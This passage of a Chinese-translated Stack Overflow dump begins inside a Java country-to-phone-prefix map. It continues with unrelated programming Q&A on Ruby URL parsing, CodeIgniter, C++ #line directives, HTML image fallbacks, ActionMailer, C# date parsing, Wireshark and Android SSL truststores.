    country2phone.put("AU", "+61");
    country2phone.put("AT", "+43");
    country2phone.put("AZ", "+994");
    country2phone.put("BS", "+1-242");
    country2phone.put("BH", "+973");
    country2phone.put("BD", "+880");
    country2phone.put("BB", "+1-246");
    country2phone.put("BY", "+375");
    country2phone.put("BE", "+32");
    country2phone.put("BZ", "+501");
    country2phone.put("BJ", "+229");
    country2phone.put("BT", "+975");
    country2phone.put("BO", "+591");
    country2phone.put("BA", "+387");
    country2phone.put("BW", "+267");
    country2phone.put("BR", "+55");
    country2phone.put("BN", "+673");
    country2phone.put("BG", "+359");
    country2phone.put("BF", "+226");
    country2phone.put("BI", "+257");
    country2phone.put("KH", "+855");
    country2phone.put("CM", "+237");
    country2phone.put("CA", "+1");
    country2phone.put("CV", "+238");
    country2phone.put("CF", "+236");
    country2phone.put("TD", "+235");
    country2phone.put("CL", "+56");
    country2phone.put("CN", "+86");
    country2phone.put("CO", "+57");
    country2phone.put("KM", "+269");
    country2phone.put("CD", "+243");
    country2phone.put("CG", "+242");
    country2phone.put("CR", "+506");
    country2phone.put("CI", "+225");
    country2phone.put("HR", "+385");
    country2phone.put("CU", "+53");
    country2phone.put("CY", "+357");
    country2phone.put("CZ", "+420");
    country2phone.put("DK", "+45");
    country2phone.put("DJ", "+253");
    country2phone.put("DM", "+1-767");
    country2phone.put("DO", "+1-809and1-829");
    country2phone.put("EC", "+593");
    country2phone.put("EG", "+20");
    country2phone.put("SV", "+503");
    country2phone.put("GQ", "+240");
    country2phone.put("ER", "+291");
    country2phone.put("EE", "+372");
    country2phone.put("ET", "+251");
    country2phone.put("FJ", "+679");
    country2phone.put("FI", "+358");
    country2phone.put("FR", "+33");
    country2phone.put("GA", "+241");
    country2phone.put("GM", "+220");
    country2phone.put("GE", "+995");
    country2phone.put("DE", "+49");
    country2phone.put("GH", "+233");
    country2phone.put("GR", "+30");
    country2phone.put("GD", "+1-473");
    country2phone.put("GT", "+502");
    country2phone.put("GN", "+224");
    country2phone.put("GW", "+245");
    country2phone.put("GY", "+592");
    country2phone.put("HT", "+509");
    country2phone.put("HN", "+504");
    country2phone.put("HU", "+36");
    country2phone.put("IS", "+354");
    country2phone.put("IN", "+91");
    country2phone.put("ID", "+62");
    country2phone.put("IR", "+98");
    country2phone.put("IQ", "+964");
    country2phone.put("IE", "+353");
    country2phone.put("IL", "+972");
    country2phone.put("IT", "+39");
    country2phone.put("JM", "+1-876");
    country2phone.put("JP", "+81");
    country2phone.put("JO", "+962");
    country2phone.put("KZ", "+7");
    country2phone.put("KE", "+254");
    country2phone.put("KI", "+686");
    country2phone.put("KP", "+850");
    country2phone.put("KR", "+82");
    country2phone.put("KW", "+965");
    country2phone.put("KG", "+996");
    country2phone.put("LA", "+856");
    country2phone.put("LV", "+371");
    country2phone.put("LB", "+961");
    country2phone.put("LS", "+266");
    country2phone.put("LR", "+231");
    country2phone.put("LY", "+218");
    country2phone.put("LI", "+423");
    country2phone.put("LT", "+370");
    country2phone.put("LU", "+352");
    country2phone.put("MK", "+389");
    country2phone.put("MG", "+261");
    country2phone.put("MW", "+265");
    country2phone.put("MY", "+60");
    country2phone.put("MV", "+960");
    country2phone.put("ML", "+223");
    country2phone.put("MT", "+356");
    country2phone.put("MH", "+692");
    country2phone.put("MR", "+222");
    country2phone.put("MU", "+230");
    country2phone.put("MX", "+52");
    country2phone.put("FM", "+691");
    country2phone.put("MD", "+373");
    country2phone.put("MC", "+377");
    country2phone.put("MN", "+976");
    country2phone.put("ME", "+382");
    country2phone.put("MA", "+212");
    country2phone.put("MZ", "+258");
    country2phone.put("MM", "+95");
    country2phone.put("NA", "+264");
    country2phone.put("NR", "+674");
    country2phone.put("NP", "+977");
    country2phone.put("NL", "+31");
    country2phone.put("NZ", "+64");
    country2phone.put("NI", "+505");
    country2phone.put("NE", "+227");
    country2phone.put("NG", "+234");
    country2phone.put("NO", "+47");
    country2phone.put("OM", "+968");
    country2phone.put("PK", "+92");
    country2phone.put("PW", "+680");
    country2phone.put("PA", "+507");
    country2phone.put("PG", "+675");
    country2phone.put("PY", "+595");
    country2phone.put("PE", "+51");
    country2phone.put("PH", "+63");
    country2phone.put("PL", "+48");
    country2phone.put("PT", "+351");
    country2phone.put("QA", "+974");
    country2phone.put("RO", "+40");
    country2phone.put("RU", "+7");
    country2phone.put("RW", "+250");
    country2phone.put("KN", "+1-869");
    country2phone.put("LC", "+1-758");
    country2phone.put("VC", "+1-784");
    country2phone.put("WS", "+685");
    country2phone.put("SM", "+378");
    country2phone.put("ST", "+239");
    country2phone.put("SA", "+966");
    country2phone.put("SN", "+221");
    country2phone.put("RS", "+381");
    country2phone.put("SC", "+248");
    country2phone.put("SL", "+232");
    country2phone.put("SG", "+65");
    country2phone.put("SK", "+421");
    country2phone.put("SI", "+386");
    country2phone.put("SB", "+677");
    country2phone.put("SO", "+252");
    country2phone.put("ZA", "+27");
    country2phone.put("ES", "+34");
    country2phone.put("LK", "+94");
    country2phone.put("SD", "+249");
    country2phone.put("SR", "+597");
    country2phone.put("SZ", "+268");
    country2phone.put("SE", "+46");
    country2phone.put("CH", "+41");
    country2phone.put("SY", "+963");
    country2phone.put("TJ", "+992");
    country2phone.put("TZ", "+255");
    country2phone.put("TH", "+66");
    country2phone.put("TL", "+670");
    country2phone.put("TG", "+228");
    country2phone.put("TO", "+676");
    country2phone.put("TT", "+1-868");
    country2phone.put("TN", "+216");
    country2phone.put("TR", "+90");
    country2phone.put("TM", "+993");
    country2phone.put("TV", "+688");
    country2phone.put("UG", "+256");
    country2phone.put("UA", "+380");
    country2phone.put("AE", "+971");
    country2phone.put("GB", "+44");
    country2phone.put("US", "+1");
    country2phone.put("UY", "+598");
    country2phone.put("UZ", "+998");
    country2phone.put("VU", "+678");
    country2phone.put("VA", "+379");
    country2phone.put("VE", "+58");
    country2phone.put("VN", "+84");
    country2phone.put("YE", "+967");
    country2phone.put("ZM", "+260");
    country2phone.put("ZW", "+263");
    country2phone.put("GE", "+995");
    country2phone.put("TW", "+886");
    country2phone.put("AZ", "+374-97");
    country2phone.put("CY", "+90-392");
    country2phone.put("MD", "+373-533");
    country2phone.put("SO", "+252");
    country2phone.put("GE", "+995");
    country2phone.put("CX", "+61");
    country2phone.put("CC", "+61");
    country2phone.put("NF", "+672");
    country2phone.put("NC", "+687");
    country2phone.put("PF", "+689");
    country2phone.put("YT", "+262");
    country2phone.put("GP", "+590");
    country2phone.put("GP", "+590");
    country2phone.put("PM", "+508");
    country2phone.put("WF", "+681");
    country2phone.put("CK", "+682");
    country2phone.put("NU", "+683");
    country2phone.put("TK", "+690");
    country2phone.put("GG", "+44");
    country2phone.put("IM", "+44");
    country2phone.put("JE", "+44");
    country2phone.put("AI", "+1-264");
    country2phone.put("BM", "+1-441");
    country2phone.put("IO", "+246");
    country2phone.put("", "+357");
    country2phone.put("VG", "+1-284");
    country2phone.put("KY", "+1-345");
    country2phone.put("FK", "+500");
    country2phone.put("GI", "+350");
    country2phone.put("MS", "+1-664");
    country2phone.put("SH", "+290");
    country2phone.put("TC", "+1-649");
    country2phone.put("MP", "+1-670");
    country2phone.put("PR", "+1-787and1-939");
    country2phone.put("AS", "+1-684");
    country2phone.put("GU", "+1-671");
    country2phone.put("VI", "+1-340");
    country2phone.put("HK", "+852");
    country2phone.put("MO", "+853");
    country2phone.put("FO", "+298");
    country2phone.put("GL", "+299");
    country2phone.put("GF", "+594");
    country2phone.put("GP", "+590");
    country2phone.put("MQ", "+596");
    country2phone.put("RE", "+262");
    country2phone.put("AX", "+358-18");
    country2phone.put("AW", "+297");
    country2phone.put("AN", "+599");
    country2phone.put("SJ", "+47");
    country2phone.put("AC", "+247");
    country2phone.put("TA", "+290");
    country2phone.put("CS", "+381");
    country2phone.put("PS", "+970");
    country2phone.put("EH", "+212");
}
} 
```

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2016-02-10T09:49:53.900

您可以使用Google 开发人员在 Github 上提供的名为[libphonenumber的库。](https://github.com/googlei18n/libphonenumber)例如，您可以使用以下方式获取前缀：

```
PhoneNumberUtil.getInstance().getCountryCodeForRegion("DE"); 
```

它还具有许多有用的功能来解析电话号码。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-08-22T17:49:48.877

整理@oshai的答案

```
public class CountryToPhonePrefix {

private static Map<String, String> map = new HashMap<>();

public String prefixFor(String iso2CountryCode) {
    String result = map.get(iso2CountryCode);
    if (result == null) {
        throw new IllegalArgumentException("Unknown country code " + iso2CountryCode);
    }
    return result;
}

static {
    map.put("AC", "+247");
    map.put("AD", "+376");
    map.put("AE", "+971");
    map.put("AF", "+93");
    map.put("AG", "+1-268");
    map.put("AI", "+1-264");
    map.put("AL", "+355");
    map.put("AM", "+374");
    map.put("AN", "+599");
    map.put("AO", "+244");
    map.put("AR", "+54");
    map.put("AS", "+1-684");
    map.put("AT", "+43");
    map.put("AU", "+61");
    map.put("AW", "+297");
    map.put("AX", "+358-18");
    map.put("AZ", "+374-97");
    map.put("AZ", "+994");
    map.put("BA", "+387");
    map.put("BB", "+1-246");
    map.put("BD", "+880");
    map.put("BE", "+32");
    map.put("BF", "+226");
    map.put("BG", "+359");
    map.put("BH", "+973");
    map.put("BI", "+257");
    map.put("BJ", "+229");
    map.put("BM", "+1-441");
    map.put("BN", "+673");
    map.put("BO", "+591");
    map.put("BR", "+55");
    map.put("BS", "+1-242");
    map.put("BT", "+975");
    map.put("BW", "+267");
    map.put("BY", "+375");
    map.put("BZ", "+501");
    map.put("CA", "+1");
    map.put("CC", "+61");
    map.put("CD", "+243");
    map.put("CF", "+236");
    map.put("CG", "+242");
    map.put("CH", "+41");
    map.put("CI", "+225");
    map.put("CK", "+682");
    map.put("CL", "+56");
    map.put("CM", "+237");
    map.put("CN", "+86");
    map.put("CO", "+57");
    map.put("CR", "+506");
    map.put("CS", "+381");
    map.put("CU", "+53");
    map.put("CV", "+238");
    map.put("CX", "+61");
    map.put("CY", "+90-392");
    map.put("CY", "+357");
    map.put("CZ", "+420");
    map.put("DE", "+49");
    map.put("DJ", "+253");
    map.put("DK", "+45");
    map.put("DM", "+1-767");
    map.put("DO", "+1-809"); // and 1-829?
    map.put("DZ", "+213");
    map.put("EC", "+593");
    map.put("EE", "+372");
    map.put("EG", "+20");
    map.put("EH", "+212");
    map.put("ER", "+291");
    map.put("ES", "+34");
    map.put("ET", "+251");
    map.put("FI", "+358");
    map.put("FJ", "+679");
    map.put("FK", "+500");
    map.put("FM", "+691");
    map.put("FO", "+298");
    map.put("FR", "+33");
    map.put("GA", "+241");
    map.put("GB", "+44");
    map.put("GD", "+1-473");
    map.put("GE", "+995");
    map.put("GF", "+594");
    map.put("GG", "+44");
    map.put("GH", "+233");
    map.put("GI", "+350");
    map.put("GL", "+299");
    map.put("GM", "+220");
    map.put("GN", "+224");
    map.put("GP", "+590");
    map.put("GQ", "+240");
    map.put("GR", "+30");
    map.put("GT", "+502");
    map.put("GU", "+1-671");
    map.put("GW", "+245");
    map.put("GY", "+592");
    map.put("HK", "+852");
    map.put("HN", "+504");
    map.put("HR", "+385");
    map.put("HT", "+509");
    map.put("HU", "+36");
    map.put("ID", "+62");
    map.put("IE", "+353");
    map.put("IL", "+972");
    map.put("IM", "+44");
    map.put("IN", "+91");
    map.put("IO", "+246");
    map.put("IQ", "+964");
    map.put("IR", "+98");
    map.put("IS", "+354");
    map.put("IT", "+39");
    map.put("JE", "+44");
    map.put("JM", "+1-876");
    map.put("JO", "+962");
    map.put("JP", "+81");
    map.put("KE", "+254");
    map.put("KG", "+996");
    map.put("KH", "+855");
    map.put("KI", "+686");
    map.put("KM", "+269");
    map.put("KN", "+1-869");
    map.put("KP", "+850");
    map.put("KR", "+82");
    map.put("KW", "+965");
    map.put("KY", "+1-345");
    map.put("KZ", "+7");
    map.put("LA", "+856");
    map.put("LB", "+961");
    map.put("LC", "+1-758");
    map.put("LI", "+423");
    map.put("LK", "+94");
    map.put("LR", "+231");
    map.put("LS", "+266");
    map.put("LT", "+370");
    map.put("LU", "+352");
    map.put("LV", "+371");
    map.put("LY", "+218");
    map.put("MA", "+212");
    map.put("MC", "+377");
    map.put("MD", "+373-533");
    map.put("MD", "+373");
    map.put("ME", "+382");
    map.put("MG", "+261");
    map.put("MH", "+692");
    map.put("MK", "+389");
    map.put("ML", "+223");
    map.put("MM", "+95");
    map.put("MN", "+976");
    map.put("MO", "+853");
    map.put("MP", "+1-670");
    map.put("MQ", "+596");
    map.put("MR", "+222");
    map.put("MS", "+1-664");
    map.put("MT", "+356");
    map.put("MU", "+230");
    map.put("MV", "+960");
    map.put("MW", "+265");
    map.put("MX", "+52");
    map.put("MY", "+60");
    map.put("MZ", "+258");
    map.put("NA", "+264");
    map.put("NC", "+687");
    map.put("NE", "+227");
    map.put("NF", "+672");
    map.put("NG", "+234");
    map.put("NI", "+505");
    map.put("NL", "+31");
    map.put("NO", "+47");
    map.put("NP", "+977");
    map.put("NR", "+674");
    map.put("NU", "+683");
    map.put("NZ", "+64");
    map.put("OM", "+968");
    map.put("PA", "+507");
    map.put("PE", "+51");
    map.put("PF", "+689");
    map.put("PG", "+675");
    map.put("PH", "+63");
    map.put("PK", "+92");
    map.put("PL", "+48");
    map.put("PM", "+508");
    map.put("PR", "+1-787"); // and 1-939 ?
    map.put("PS", "+970");
    map.put("PT", "+351");
    map.put("PW", "+680");
    map.put("PY", "+595");
    map.put("QA", "+974");
    map.put("RE", "+262");
    map.put("RO", "+40");
    map.put("RS", "+381");
    map.put("RU", "+7");
    map.put("RW", "+250");
    map.put("SA", "+966");
    map.put("SB", "+677");
    map.put("SC", "+248");
    map.put("SD", "+249");
    map.put("SE", "+46");
    map.put("SG", "+65");
    map.put("SH", "+290");
    map.put("SI", "+386");
    map.put("SJ", "+47");
    map.put("SK", "+421");
    map.put("SL", "+232");
    map.put("SM", "+378");
    map.put("SN", "+221");
    map.put("SO", "+252");
    map.put("SO", "+252");
    map.put("SR", "+597");
    map.put("ST", "+239");
    map.put("SV", "+503");
    map.put("SY", "+963");
    map.put("SZ", "+268");
    map.put("TA", "+290");
    map.put("TC", "+1-649");
    map.put("TD", "+235");
    map.put("TG", "+228");
    map.put("TH", "+66");
    map.put("TJ", "+992");
    map.put("TK", "+690");
    map.put("TL", "+670");
    map.put("TM", "+993");
    map.put("TN", "+216");
    map.put("TO", "+676");
    map.put("TR", "+90");
    map.put("TT", "+1-868");
    map.put("TV", "+688");
    map.put("TW", "+886");
    map.put("TZ", "+255");
    map.put("UA", "+380");
    map.put("UG", "+256");
    map.put("US", "+1");
    map.put("UY", "+598");
    map.put("UZ", "+998");
    map.put("VA", "+379");
    map.put("VC", "+1-784");
    map.put("VE", "+58");
    map.put("VG", "+1-284");
    map.put("VI", "+1-340");
    map.put("VN", "+84");
    map.put("VU", "+678");
    map.put("WF", "+681");
    map.put("WS", "+685");
    map.put("YE", "+967");
    map.put("YT", "+262");
    map.put("ZA", "+27");
    map.put("ZM", "+260");
    map.put("ZW", "+263");
}} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T07:28:09.420

[从这里](https://stackoverflow.com/questions/5402253/getting-telephone-country-code-with-android)复制

```
 /**
     * network iso code: referred and listed at:
     * http://en.wikipedia.org/wiki/List_of_mobile_country_codes
     */
      TelephonyManager manager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
    String DEVICE_COUNTRY = manager.getNetworkCountryIso(); 
```

[更新:: 从这里](https://stackoverflow.com/questions/3659809/where-am-i-get-country)复制

```
String locale = getApplicationCOntext().getResources().getConfiguration().locale.getCountry(); 
```

# ruby-on-rails-3 - 解析 URL 并删除结尾部分

> ID：10772335
> 
> 赞同：0
> 
> 时间：2012-05-27T07:23:24.397
> 
> 标签：ruby-on-rails-3

我正在尝试解析 URL。例如，我试图退出的地方：

```
~/locations/1 => [locations,1]
~/locations/1/comments => [locations,1]
~/locations/1/comments/22 => [locations,1]
~/locations/1/buildings/3 => [buildings,3]
~/locations/1/buildings/3/comments => [buildings,3]
~/locations/1/buildings/3/comments/34 => [buildings,3] 
```

格式相当一致。我从数组开始，但似乎仍然失败：

```
@request_path = request.path.downcase.split('/')
@comment_index = @request_path.index("comments").to_i
if @comment_index > 0
  @request_path = @request_path.drop_while { |i| i.to_i >= @comment_index }
end
resource, id = @request_path.last(2) 
```

我添加了小写字母，以防有人手动输入大写 URL。drop_while 似乎不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:20:28.287

处理代码后你有什么样的输出？

# 已编辑

你的问题是你转换元素`to_i`，它是`0`. 但是您想比较`index`元素，但通常可以`index`使用[Array#index](http://www.ruby-doc.org/core-1.9.3/Array.html#method-i-index)方法在这种情况下获取元素。

**正确做法：**

```
@request_path.drop_while { |i| @request_path.index(i) >= @comment_index } 
```

您可以`path`在没有`drop_while`.

**我的解决方案：**

```
def resource_details(path)
    resource_array = path.downcase.split("/").reject!(&:empty?)
    key = resource_array.index("comments")
    return key.present? ? (resource_array - resource_array[key..key + 1]).last(2) : resource_array.last(2)
 end 
```

它将切断`["comments"]`或`["comments","2"]`为您的路径。

调用该方法：

```
1.9.3p0 :051 > resource_details("/locations/1/buildings/3/comments")
 => ["buildings", "3"] 

1.9.3p0 :052 > resource_details("/locations/1/comments/2")
 => ["locations", "1"] 
```

# php - MVC：模型、控制器还是库？

> ID：10772340
> 
> 赞同：3
> 
> 时间：2012-05-27T07:24:23.383
> 
> 标签：php, model-view-controller, codeigniter

我第一次使用框架（codeigniter）构建 CRM，但在维护 MVC 方法的同时，我无法确定某个模块应该去哪里。该模块会自动生成一个新用户（当创建新公司时）并将登录详细信息通过电子邮件发送到提供的电子邮件地址。

我熟悉瘦控制器和胖模型的想法，但要编译所需的所有信息，模块必须从几个不同的表中请求数据，并将数据插入到多个表中。

到目前为止我考虑过的场景：

1.  逻辑在大部分信息来自的模型中。
2.  创建一个全新的模型，只处理这个模块和所需的多个表。
3.  将逻辑放在处理创建公司的控制器中。
4.  创建一个新的库或助手，并在需要时调用该模块。

瘦控制器和胖模型似乎表明一两个是正确的选择，但我被引导相信模型应该只处理数据库中的一个表。

确保遵守 MVC 的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:38:39.510

Codeigniter 允许您灵活地使用 MVC 方法。所以答案是哪个选项是：

*   您（或您的团队）最容易理解
*   最容易代码维护
*   别人最容易理解

如果您没有任何其他库并且不了解库，那么将您的代码放入库是没有意义的。就像你所有的模型都是“胖”的一样，但只指向一个表，你是否希望这个模型是唯一一个也指向其他 4 个表的模型？

就个人而言，如果这种“逻辑”只发生在一个地方，那么我会将它放入控制器中，并调用您需要执行每一位代码的 4x 模型。

如果这种“逻辑”出现在多个地方，我会将其放入库中，并在需要时调用它。

# c++ - 使用 antlr 和 line 指令插入 C++ 代码

> ID：10772342
> 
> 赞同：5
> 
> 时间：2012-05-27T07:25:14.587
> 
> 标签：c++, translation, antlr

我正在使用 antlr 将自定义语言翻译成 C++ 代码。在这种语言中，用户可以在指令之间嵌入 C++ 代码片段`$code...$endcode`，并按原样插入到翻译后的 C++ 代码中。

我有以下问题：当代码片段中有错误时，我希望编译器指向源文件而不是翻译后的 C++ 代码。

我尝试如下使用行指令，但它不起作用：

```
"foo.custom_laguage"
1 $code
2 ...some c++ code...
3 $endcode 
```

被翻译成

```
"auto-generated.cpp"
42 #line 2 "foo.custom_language"
43 ...some c++ code...
44 #line __LINE__ __FILE__ 
```

我认为这不起作用，因为#line 指令修改了`__LINE__`稍后由宏写入的内容。如何将行号设置回翻译后的 C++ 代码中的*实际行号？*antlr 是如何做到这一点的？

这是我希望自动生成的代码的样子：

```
"auto-generated.cpp"
42 #line 2 "foo.custom_language"
43 ...some c++ code...
44 #line 44 "auto-generated.cpp"  //actual line in this file
45 ..some more C++ code ... 
```

**编辑：** 我刚刚发现有一种方法可以通过使用`#line default`指令在 C# 语言中执行此操作：http: [//msdn.microsoft.com/en-us/library/34dk387t.aspx](http://msdn.microsoft.com/en-us/library/34dk387t.aspx) 但找不到任何类似的 C++

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:52:41.347

从问题中不清楚，但是您正在生成`#line`自己给出的指令`source-line`，并且`source-file`？对不起，我对 Antlr 不熟悉。

实际上，除了将宏`#line __LINE__ __FILE__`分配给自身之外什么也不做。`__LINE__`

由于预处理器的求值语义，您不能轻易地将数值赋给`__LINE__`宏。（你只能定义一个新的宏来映射到宏`__LINE__`，返回它的*当前*值。）但是你为什么需要它呢？除非 Antlr 本身使用该`__LINE__`宏，否则您不需要将其恢复为之前的值。

如果这是一个问题，最直接的解决方案是将原始 C++ 代码放在单独`include`的文件中并放弃内联嵌入。为了防止头文件的扩散，您可以使用类似的构造

```
$code
#define USE_SNIPPET_FOO
#include "snippets.h"
$endcode

$code
#define USE_SNIPPET_BAR
#include "snippets.h"
$endcode 
```

在标题中，一种反向标题保护：

```
#ifdef USE_SNIPPET_FOO
#undef USE_SNIPPET_FOO
class foo {};

#elif defined USE_SNIPPET_BAR
#undef USE_SNIPPET_BAR
class bar {};

#else
#error no snippet selected
#endif 
```

# html - 显示替代图像

> ID：10772346
> 
> 赞同：22
> 
> 时间：2012-05-27T07:27:22.243
> 
> 标签：html, css

如果找不到原始源文件，是否可以显示备用图像？我想只用 css 和 html 来实现这一点，没有 javascript（或 jQuery 等）。这个想法是仍然显示图像，而不是 IE 的“alt”测试或默认（丑陋）交叉。如果没有 javascript 是不可能的，那么我宁愿用基本的 if-then-else 用 php 检查 img src。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2017-03-01T12:01:41.290

**用很少的代码实现这一目标的非常简单和最好的方法**

```
<img class="avatar" src="img/one.jpg" alt="Not Found" onerror=this.src="img/undefined.jpg"> 
```

对我来说，上述作品完美！

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-05-27T07:36:38.070

您可以使用 img 元素的 CSS background-image 属性来执行此操作，即

```
img
{
background-image:url('default.png');
} 
```

但是，您必须提供宽度或高度才能使其正常工作（当找不到 img-src 时）：

```
img
{
background-image:url('default.png');
width:400px;
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-05-27T08:13:35.337

```
<object data="foobar.png" width=200 height=200>
  <img src="test.png" alt="Just testing.">
</object> 
```

这`foobar.png`是主图像，`test.png`是后备图像。根据元素的语义，当且仅当主要数据（由属性指定）无法使用时，才应呈现`object`元素（此处为元素）的内容。`img``data`

尽管浏览器在过去一年的实现中出现了严重的错误`object`，但这种简单的技术似乎适用于现代版本的 IE、Firefox、Chrome。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2020-03-19T08:49:44.213

> 是的，你可以只使用 html 来做到这一点，当找不到 img src 时它会抛出错误，所以我们可以在这里处理它。再设置一点 this.onerror = null 用于递归调用（未找到默认图像）

```
<img alt="User Image" class="user-image" src="/Resources/images/user-icon.png" onerror="this.onerror=null; this.src='/Resources/images/user-icon.png'"> 
```

# c# - Action Mailer MVC3 和内联图像

> ID：10772351
> 
> 赞同：1
> 
> 时间：2012-05-27T07:27:35.023
> 
> 标签：c#, asp.net-mvc-3, razor, actionmailer

CI 正在使用 MVC.ActionMailer 从我的网站发送电子邮件。我在将内联图像嵌入电子邮件时遇到问题。

这是我的控制器动作

```
public EmailResult WelcomeEmail()
    {
        WelcomeMailVM welcomeDetails = new WelcomeMailVM()
        var path = HttpContext.Current.Server.MapPath("~/Content/images/myImage.png");
        Attachments.Add("myImage.png", System.IO.File.ReadAllBytes(path));
        //Attachments.Inline["holidaymate.png"] = System.IO.File.ReadAllBytes(path);
        To.Add("someEmail@test.com");
        From = "noreply@myDomain.com";
        Subject = "Welcome to My Site;
        return Email("WelcomeEmail", welcomeDetails);
    } 
```

以及电子邮件的视图

```
@model HolidayMate.API.ViewModels.Mail.WelcomeMailVM
@using ActionMailer.Net.Mvc

@{
     Layout = "~/Views/Shared/_MailLayout.cshtml";
 }
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

 <table cellpadding="0" cellspacing="0" border="0" id="backgroundTable">
 <tr>
    <td style="width:300px">
        @Html.InlineImage("myImage.png")
    </td>
    <td style="width:300px">
        <table cellpadding="0" cellspacing="0" border="0">
            <tr>
                <td>Date</td>
                <td>@DateTime.Now.ToString("dd MMMM yyyy")
                </td>
            </tr>
        </table>
    </td>
</tr>
</table> 
```

电子邮件发送完美。但图像未显示在电子邮件中。我在 gmail 和 Thunderbird 中遇到了这个问题。不幸的是，我没有可以测试的前景。谷歌搜索时，我发现以下内容

[#38 Thunderbird 中不显示内联图像](https://bitbucket.org/swaj/actionmailer.net/issue/38/inline-images-are-not-displayed-in)

但我不确定将电子邮件的内容类型发送到哪里。请任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T10:24:11.640

我使用 MVC Mailer 而不是 ActionMailer。现在图像工作正常。

但是现在我无法发送电子邮件，除非我使用以下 SMTP 设置，我的正常设置不起作用

```
<mailSettings >
  <smtp deliveryMethod="Network" from="noreply@holidaymate.co.za">
    <network enableSsl="true" host="mail.mySMTP.com" port="25"  defaultCredentials="true" />
  </smtp>
</mailSettings> 
```

不起作用，但是在使用以下内容时它可以工作

```
<mailSettings >
  <smtp deliveryMethod="Network" from="noreply@myDomain.co.za">
      network enableSsl="true" host="smtp.gmail.com" port="587" userName="someemail@gmail.com" password="mypassword"/>
  </smtp>
</mailSettings> 
```

# c# - 将参数值从字符串转换为日期时间失败

> ID：10772353
> 
> 赞同：0
> 
> 时间：2012-05-27T07:28:07.060
> 
> 标签：c#, formatting

```
myCommand1.Parameters.Add("@I_vBACHNUMB", SqlDbType.Char).Value = GLHdr.BACHNUMB;
myCommand1.Parameters.Add("@I_vREFRENCE", SqlDbType.Char).Value = "ExcelImport";
myCommand1.Parameters.Add("@I_vTRXDATE", SqlDbType.DateTime).Value = GLHdr.TRXDATE; 
```

在最后一行我有 value `GLHdr.TRXDATE: "15-02-2017"`。

我收到格式异常。让我知道我在哪里做错了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:30:29.903

`GLHdr.TRXDATE`是一个*字符串*，而不是一个`DateTime`。

`DateTime`在传递它之前，您需要将其解析为：

```
var dt = DateTime.Parse(GLHdr.TRXDATE);
myCommand1.Parameters.Add("@I_vTRXDATE", SqlDbType.DateTime).Value = dt; 
```

注意`DateTime.Parse` *可以*失败，so `ParseExact`or `TryParseExact`that也取一个格式字符串可能更适合你的具体情况。

# networking - Wireshark - 标识：TTL 包的 0x0000 (0)

> ID：10772356
> 
> 赞同：0
> 
> 时间：2012-05-27T07:29:05.293
> 
> 标签：networking, protocols, wireshark

我使用wireshark检查网络中的传输。

我查看从其他计算机发送给我的包裹（超过生存时间的包裹）。

当我查看 Internet 协议部分时，我发现大多数包都带有`Identification: 0x0000 (0)`. 为什么会发生这种情况，它的含义是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:40:40.937

它用于分片。如果您拆分一个数据包，它的所有片段都将包含相同的标识。这样接收方就可以知道该片段属于哪个数据包。

由于通常会避免碎片化，因此您通常会看到 Identification = 0。但是，我确实记得一些堆栈将其用于其他实验目的。

### 为伯凯编辑

> 当我查看 Internet 协议部分时，我发现大多数包都带有标识：0x0000 (0)。为什么会发生这种情况，以及它的含义是什么

# java - 证书随机未正确创建

> ID：10772358
> 
> 赞同：4
> 
> 时间：2012-05-27T07:29:25.080
> 
> 标签：java, android, apache, ssl-certificate

我创建了一个自定义 httpclient，用于接收我的自定义信任存储，并将其用于它尝试访问的所有 ssl 站点。这是代码：

```
public class MyHttpClient extends DefaultHttpClient {

    private Context context;

    public MyHttpClient(Context context) {

        this.context = context;
    }

    @Override
    protected ClientConnectionManager createClientConnectionManager() {

        SchemeRegistry registry = new SchemeRegistry();
        registry.register(new Scheme("http", PlainSocketFactory
                .getSocketFactory(), 80));
        registry.register(new Scheme("https", newSslSocketFactory(), 443));
        return new SingleClientConnManager(getParams(), registry);
    }

    private SSLSocketFactory newSslSocketFactory() {

        try {
            KeyStore trusted = KeyStore.getInstance("BKS");
            InputStream in = context.getResources().openRawResource(
                    R.raw.cacerts);
            try {
                trusted.load(in, "changeit".toCharArray());
            }
            catch (CertificateException c) {
                System.out
                        .println("There was a certificate exception in myhttpclient!");
            }
            finally {

                in.close();
            }
            return new SSLSocketFactory(trusted);
            }
            catch (Exception e) {
                throw new AssertionError(e);
            }
    }
} 
```

这是它给我的堆栈跟踪：

```
W/System.err(4194): javax.net.ssl.SSLPeerUnverifiedException: No peer certificate
W/System.err(4194):     at org.apache.harmony.xnet.provider.jsse.SSLSessionImpl.getPeerCertificates(SSLSessionImpl.java:258)
W/System.err(4194):     at org.apache.http.conn.ssl.AbstractVerifier.verify(AbstractVerifier.java:93)
W/System.err(4194):     at org.apache.http.conn.ssl.SSLSocketFactory.createSocket(SSLSocketFactory.java:381)
W/System.err(4194):     at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:177)
W/System.err(4194):     at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:164)
W/System.err(4194):     at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:119)
W/System.err(4194):     at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:428)
W/System.err(4194):     at org.apache.http.impl.client.AbstractHttpClient$1.executeRequestSending(AbstractHttpClient.java:608)
W/System.err(4194):     at org.apache.http.impl.client.naf.redirect.NafRequestExecutorWrapperRedirectionHandler.executeRequestSendingUsual(NafRequestExecutorWrapperRedirectionHandler.java:96)
